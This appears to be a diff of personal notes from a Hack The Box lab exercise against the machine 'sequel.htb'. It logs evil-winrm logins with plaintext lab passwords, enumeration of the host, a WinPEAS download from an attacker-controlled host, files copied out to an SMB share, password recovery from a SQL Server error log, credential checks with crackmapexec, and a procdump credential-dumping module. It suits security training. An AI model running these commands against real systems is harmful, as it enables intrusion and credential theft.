@@ -11,7 +11,12 @@
 // PublicUser : GuestUserCantWrite1
 
 //CREDS:
-// sql_svc : REGGIE1234ronnie
+// sequel.htb\sql_svc : REGGIE1234ronnie
+// sequel.htb\Ryan.Cooper : NuclearMosquito3
+
+//Flags:
+//User: 	49fe80c971e6516eb020ce5e7b65425f
+//System:	
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -253,31 +258,268 @@ firefox-esr domain_policy.html
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-
-
-
-evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
-
 // evil-winrm
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 // connect
 2023-03-11 00:18:29 EST -- 
-evil-winrm -i 10.10.11.202 -P 5985 -u 'sql_svc' -p 'REGGIE1234ronnie'
+evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
+
+//TimeOut Issue. Switched out VPN pack for TCP
+
+2023-03-14 19:23:28 EDT -- 
+evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
+//Success!!!
+
+2023-03-14 19:24:53 EDT -- 
+$PSVERSIONTABLE
+
+Name                           Value
+----                           -----
+PSVersion                      5.1.17763.2746
+PSEdition                      Desktop
+PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
+BuildVersion                   10.0.17763.2746
+CLRVersion                     4.0.30319.42000
+WSManStackVersion              3.0
+PSRemotingProtocolVersion      2.3
+SerializationVersion           1.1.0.1
+
+2023-03-14 19:25:42 EDT -- 
+hostname
+dc
+
+ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : dc
+   Primary Dns Suffix  . . . . . . . : sequel.htb
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : sequel.htb
+                                       htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-34-6F
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::21c(Preferred)
+   Lease Obtained. . . . . . . . . . : Tuesday, March 14, 2023 2:50:49 PM
+   Lease Expires . . . . . . . . . . : Wednesday, March 15, 2023 1:20:49 AM
+   IPv6 Address. . . . . . . . . . . : dead:beef::8dc7:4e9d:6fb5:af48(Preferred)
+   Link-local IPv6 Address . . . . . : fe80::8dc7:4e9d:6fb5:af48%4(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.10.11.202(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a0ee%4
+                                       10.10.10.2
+   DHCPv6 IAID . . . . . . . . . . . : 251678806
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-28-88-DA-51-00-0C-29-37-43-59
+   DNS Servers . . . . . . . . . . . : 127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+ls C:\
+
+Directory: C:\
 
 
-// connect with scripts enabled (-s) and .Net exes enabled (-e)
-evil-winrm -i <IPADDRESS> -P <PORT> -u <USER> -p <PASSWORD> -s /path/to/Powershell/scripts -e /path/to/dotnet/exes
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/1/2023   8:15 PM                PerfLogs
+d-r---         2/6/2023  12:08 PM                Program Files
+d-----       11/19/2022   3:51 AM                Program Files (x86)
+d-----       11/19/2022   3:51 AM                Public
+d-----         2/1/2023   1:02 PM                SQLServer
+d-r---         2/1/2023   1:55 PM                Users
+d-----         2/6/2023   7:21 AM                Windows
 
 
-// how to use evil-winrm scripts example (NOTE: Windows Defender can block)
-Get-PassHashes.ps1
-Get-PassHashes
 
+ls C:\Users
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:58 AM                Administrator
+d-r---        7/20/2021  12:23 PM                Public
+d-----         2/1/2023   6:37 PM                Ryan.Cooper
+d-----         2/7/2023   8:10 AM                sql_svc
+
+// Ryan.Cooper is the next target
+
+//PrepFor WinPeas
+cd C:\Users\sql_svc\appdata\local\Temp
+
+-- privesc --
+//sql_svc
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-14 19:37:34 EDT -- 
+## winpeas (windows)
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20230312/winPEASany.exe
+
+python3 -m http.server 443
+
+2023-03-14 19:40:00 EDT -- 
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.52:443/winPEASany.exe', 'C:\Users\sql_svc\appdata\local\Temp\wPEAS.exe')
+
+impacket-smbserver -smb2support PUBLIC .
+
+2023-03-14 19:45:49 EDT -- Check
+net use \\10.10.16.52\PUBLIC
+//Success
+
+2023-03-14 19:47:11 EDT -- 6
+./wPEAS.exe -lolbas log=\\10.10.16.52\PUBLIC\wPEAS.out
+
+SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+
+╔══════════╣ Home folders found
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\Public
+    C:\Users\Ryan.Cooper
+    C:\Users\sql_svc : sql_svc [AllAccess]
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
+// Back to WinRM
+// sequel.htb\Ryan.Cooper : NuclearMosquito3
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-14 20:31:38 EDT -- 
+cd C:\SQLServer
+
+ls
+
+
+    Directory: C:\SQLServer
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
+
+cd Logs
+
+ls
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+2023-03-14 20:33:33 EDT -- 
+download ERRORLOG.BAK
+//Download Failed
+
+2023-03-14 20:39:51 EDT -- 
+copy ERRORLOG.BAK \\10.10.16.52\PUBLIC\ERRORLOG.BAK
+
+dos2unix ERRORLOG.BAK
+
+less ERRORLOG.BAK
+//2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+//2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+ 
+//TestCreds
+2023-03-14 20:43:30 EDT -- 
+crackmapexec smb 10.10.11.202 -u 'sequel.htb\Ryan.Cooper' -p NuclearMosquito3
+[+] sequel.htb\sequel.htb\Ryan.Cooper:NuclearMosquito3
+//Success 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// evil-winrm
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// connect
+2023-03-14 20:50:37 EDT -- 
+evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
+//Success
+
+ls
+
+
+    Directory: C:\Users\Ryan.Cooper
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         2/6/2023   7:43 AM                3D Objects
+d-r---         2/6/2023   7:43 AM                Contacts
+d-r---         2/6/2023   7:43 AM                Desktop
+d-r---         2/6/2023   7:43 AM                Documents
+d-r---         2/6/2023   7:43 AM                Downloads
+d-r---         2/6/2023   7:43 AM                Favorites
+d-r---         2/6/2023   7:43 AM                Links
+d-r---         2/6/2023   7:43 AM                Music
+d-r---         2/6/2023   7:43 AM                Pictures
+d-r---         2/6/2023   7:43 AM                Saved Games
+d-r---         2/6/2023   7:43 AM                Searches
+d-r---         2/6/2023   7:43 AM                Videos
+
+ls Desktop
+
+
+    Directory: C:\Users\Ryan.Cooper\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        3/14/2023   2:51 PM             34 user.txt
+
+2023-03-14 20:56:10 EDT -- 
+cat Desktop/user.txt
+//49fe80c971e6516eb020ce5e7b65425f
+
+whoami /all
+//sequel\ryan.cooper S-1-5-21-4078382237-1492182817-2568127209-1105
+//Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enablede
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+
+
+// [EXTRA] ProcDump via CrackMap
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+wget https://download.sysinternals.com/files/Procdump.zip
+unzip -p Procdump.zip procdump64.exe > /tmp/procdump.exe
+
+2023-03-14 20:21:22 EDT -- 
+crackmapexec smb 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
+
+2023-03-14 20:21:23 EDT -- 
+crackmapexec smb 10.10.11.202 -u sql_svc -p REGGIE1234ronnie -M procdump 
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
